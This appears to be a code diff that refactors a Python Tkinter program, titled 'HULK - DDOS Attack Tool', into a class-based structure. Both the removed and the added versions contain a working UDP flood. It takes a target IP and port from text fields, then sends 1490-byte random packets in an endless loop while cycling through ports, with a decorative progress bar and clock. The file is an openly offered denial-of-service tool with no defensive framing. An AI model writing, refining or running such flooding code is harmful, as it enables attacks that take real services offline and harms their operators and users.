@@ -1,100 +1,98 @@
+import os
+import time
+import socket
+import random
+from datetime import datetime
 from tkinter import *
 from tkinter.ttk import *
 from time import strftime
 
-
-def time():
-
-    string = strftime('%H:%M:%S %p')
-
-    lbl.config(text=string)
-
-    lbl.after(1000, time)
-
-
-def attack():
-    import sys
-    import os
-    import time
-    import socket
-    import random
-    # Code Time
-    from datetime import datetime
-    now = datetime.now()
-    hour = now.hour
-    minute = now.minute
-    day = now.day
-    month = now.month
-    year = now.year
-
-    ##############
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1490)
-    #############
-
-    os.system("clear")
-
-    #ip = raw_input("IP Target : ")
-    #port = input("Port       : ")
-    global pr
-    pr = E1.get()
-    ip = pr
-    global rt
-    rt = E2.get()
-    port = (int(rt))
-
-    os.system("clear")
-    #os.system("figlet Attack Starting")
-    print("[>                      ] 0% ")
-    time.sleep(0.5)
-    print("[=====>      H          ] 25%")
-    time.sleep(0.5)
-    print("[==========> U          ] 50%")
-    time.sleep(0.5)
-    print("[==========  L ====>    ] 75%")
-    time.sleep(0.5)
-    print("[==========  K ========>] 100%")
-    time.sleep(3)
-    sent = 0
-    while True:
-        sock.sendto(bytes, (ip, port))
-        sent = sent + 1
-        port = port + 1
-        print("Sent %s packet to %s throught port:%s -by HULK" %
-              (sent, ip, port))
-        if port == 65534:
-            port = 1
-
-    pass
-
-
-root = Tk()
-root.title("HULK- DDOS Attack Tool")
-root.geometry("350x200+385+105")
-root.resizable(0, 0)
-
-lbl = Label(root, font=('calibri', 20, 'bold'),
-
+class HulkDDOS:
+    def __init__(self):
+        self.root = Tk()
+        self.setup_window()
+        self.setup_widgets()
+        
+    def setup_window(self):
+        """Configure the main window settings"""
+        self.root.title("HULK - DDOS Attack Tool")
+        self.root.geometry("350x200+385+105")
+        self.root.resizable(0, 0)
+        
+    def setup_widgets(self):
+        """Create and arrange all GUI elements"""
+        # Clock label
+        self.time_label = Label(
+            self.root,
+            font=('calibri', 20, 'bold'),
             background='purple',
+            foreground='white'
+        )
+        self.time_label.pack(anchor='s')
+        
+        # IP input
+        Label(self.root, text="IP Address").pack(side=TOP)
+        self.ip_entry = Entry(self.root)
+        self.ip_entry.pack(side=TOP)
+        
+        # Port input
+        Label(self.root, text="Port").pack(side=TOP)
+        self.port_entry = Entry(self.root)
+        self.port_entry.pack(side=TOP)
+        
+        # Attack button
+        Button(self.root, text="Attack", command=self.attack).pack(side=TOP)
+        
+    def update_clock(self):
+        """Update the clock display"""
+        time_string = strftime('%H:%M:%S %p')
+        self.time_label.config(text=time_string)
+        self.time_label.after(1000, self.update_clock)
+        
+    def show_progress(self):
+        """Display attack progress animation"""
+        progress_steps = [
+            ("[>                      ] 0% ", 0.5),
+            ("[=====>      H          ] 25%", 0.5),
+            ("[==========> U          ] 50%", 0.5),
+            ("[==========  L ====>    ] 75%", 0.5),
+            ("[==========  K ========>] 100%", 3)
+        ]
+        
+        for message, delay in progress_steps:
+            print(message)
+            time.sleep(delay)
+            
+    def attack(self):
+        """Execute the DDOS attack"""
+        try:
+            # Initialize attack parameters
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            bytes_data = random._urandom(1490)
+            
+            # Get target information
+            ip = self.ip_entry.get()
+            port = int(self.port_entry.get())
+            
+            os.system("clear")
+            self.show_progress()
+            
+            # Start attack
+            sent = 0
+            while True:
+                sock.sendto(bytes_data, (ip, port))
+                sent += 1
+                port = port + 1 if port < 65534 else 1
+                print(f"Sent {sent} packet to {ip} through port:{port} -by HULK")
+                
+        except Exception as e:
+            print(f"Error: {str(e)}")
+            
+    def run(self):
+        """Start the application"""
+        self.update_clock()
+        self.root.mainloop()
 
-            foreground='white')
-
-lbl.pack(anchor='s')
-time()
-
-global E1
-global E2
-L1 = Label(root, text="ip address")
-L1.pack(side=TOP)
-E1 = Entry(root)  # , bd =5)
-E1.pack(side=TOP)
-
-
-L2 = Label(root, text="port")
-L2.pack(side=TOP)
-E2 = Entry(root)  # , bd =5)
-E2.pack(side=TOP)
-
-button = Button(root, text="attack", command=attack).pack(
-    side=TOP)  # ,font=('comicsansms 19 bold')).pack(side=TOP)
-root.mainloop()
+if __name__ == "__main__":
+    app = HulkDDOS()
+    app.run()
